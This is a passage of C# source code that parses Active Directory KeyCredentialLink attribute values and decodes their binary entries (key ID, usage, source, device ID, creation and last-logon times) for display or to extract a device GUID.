                    string dnWithBinary = keyCredLink.ToString();
                    if (dnWithBinary.StartsWith("B:", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dnWithBinary.Split(':');
                        if (parts.Length >= 4)
                        {
                            blobData = HexStringToBytes(parts[2]);
                            dnString = string.Join(":", parts.Skip(3));
                        }
                    }
                }

                if (blobData == null)
                {
                    OutputHelper.Verbose($"      Could not parse KeyCredential data");
                    return;
                }

                if (!string.IsNullOrEmpty(dnString))
                    OutputHelper.Verbose($"      Owner: {dnString}");

                ParseKeyCredentialBlob(blobData);
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"      Parse error: {ex.Message}");
            }
        }

        private static void ParseKeyCredentialBlob(byte[] blob)
        {
            if (blob.Length < 4)
            {
                Console.WriteLine("      Blob too small");
                return;
            }

            uint version = BitConverter.ToUInt32(blob, 0);
            OutputHelper.Verbose($"      Version: 0x{version:X8}");

            int offset = 4;
            // DSInternals format: Length (2 bytes) + Type (1 byte) + Data
            while (offset + 3 <= blob.Length)
            {
                ushort length = BitConverter.ToUInt16(blob, offset);
                byte identifier = blob[offset + 2];
                offset += 3;

                if (offset + length > blob.Length)
                    break;

                byte[] data = new byte[length];
                Array.Copy(blob, offset, data, 0, length);
                offset += length;

                string identifierName = GetIdentifierName(identifier);
                string valueStr = FormatEntryValue(identifier, data);

                // Only show essential info in minimal mode: DeviceID, CreationTime
                if (identifier == KCEI_DEVICEID || identifier == KCEI_KEYCREATION)
                {
                    Console.WriteLine($"      {identifierName}: {valueStr}");
                }
                else
                {
                    OutputHelper.Verbose($"      {identifierName}: {valueStr}");
                }
            }
        }

        private static string GetIdentifierName(byte identifier)
        {
            switch (identifier)
            {
                case KCEI_VERSION: return "Version";
                case KCEI_KEYID: return "KeyID";
                case KCEI_KEYHASH: return "KeyHash";
                case KCEI_KEYMATERIAL: return "KeyMaterial";
                case KCEI_KEYUSAGE: return "KeyUsage";
                case KCEI_KEYSOURCE: return "KeySource";
                case KCEI_DEVICEID: return "DeviceID";
                case KCEI_CUSTOMKEYINFO: return "CustomKeyInfo";
                case KCEI_KEYLASTLOGON: return "LastLogon";
                case KCEI_KEYCREATION: return "CreationTime";
                default: return $"Unknown({identifier})";
            }
        }

        private static string FormatEntryValue(byte identifier, byte[] data)
        {
            switch (identifier)
            {
                case KCEI_KEYID:
                case KCEI_KEYHASH:
                    return BitConverter.ToString(data).Replace("-", "").ToLower();

                case KCEI_KEYMATERIAL:
                    return $"[RSA Public Key, {data.Length} bytes]";

                case KCEI_KEYUSAGE:
                    byte usage = data.Length > 0 ? data[0] : (byte)0;
                    return usage == KEY_USAGE_NGC ? "NGC (0x01)" : usage == KEY_USAGE_FIDO ? "FIDO (0x07)" : $"0x{usage:X2}";

                case KCEI_KEYSOURCE:
                    byte source = data.Length > 0 ? data[0] : (byte)0;
                    return source == KEY_SOURCE_AD ? "AD (0x00)" : source == KEY_SOURCE_AZUREAD ? "AzureAD (0x01)" : $"0x{source:X2}";

                case KCEI_DEVICEID:
                    if (data.Length == 16)
                        return new Guid(data).ToString();
                    return BitConverter.ToString(data).Replace("-", "");

                case KCEI_KEYCREATION:
                case KCEI_KEYLASTLOGON:
                    if (data.Length == 8)
                    {
                        long fileTime = BitConverter.ToInt64(data, 0);
                        if (fileTime > 0)
                            return DateTime.FromFileTimeUtc(fileTime).ToString("u");
                    }
                    return BitConverter.ToString(data).Replace("-", "");

                default:
                    if (data.Length <= 32)
                        return BitConverter.ToString(data).Replace("-", "");
                    return $"[{data.Length} bytes]";
            }
        }

        private static Guid? ExtractDeviceIdFromKeyCredential(object keyCredLink)
        {
            try
            {
                byte[] blob = null;

                // Try to get binary value from COM object
                Type type = keyCredLink.GetType();
                try
                {
                    var binaryValue = type.InvokeMember("BinaryValue",
                        System.Reflection.BindingFlags.GetProperty, null, keyCredLink, null);
                    if (binaryValue is byte[] bytes)
                        blob = bytes;
                }
                catch { }

                // Fallback: try parsing as string
                if (blob == null)
                {
                    string dnWithBinary = keyCredLink.ToString();
                    if (dnWithBinary.StartsWith("B:", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = dnWithBinary.Split(':');
                        if (parts.Length >= 4)
                            blob = HexStringToBytes(parts[2]);
                    }
                }

                if (blob == null)
                    return null;

                int offset = 4; // Skip version
                // DSInternals format: Length (2 bytes) + Type (1 byte) + Data
                while (offset + 3 <= blob.Length)
                {
                    ushort length = BitConverter.ToUInt16(blob, offset);
                    byte identifier = blob[offset + 2];
                    offset += 3;

                    if (offset + length > blob.Length)
                        break;

                    if (identifier == KCEI_DEVICEID && length == 16)
                    {
                        byte[] guidBytes = new byte[16];
                        Array.Copy(blob, offset, guidBytes, 0, 16);
                        return new Guid(guidBytes);
                    }

                    offset += length;
                }
            }
            catch { }
            return null;
        }

        private static byte[] HexStringToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }
    }
}
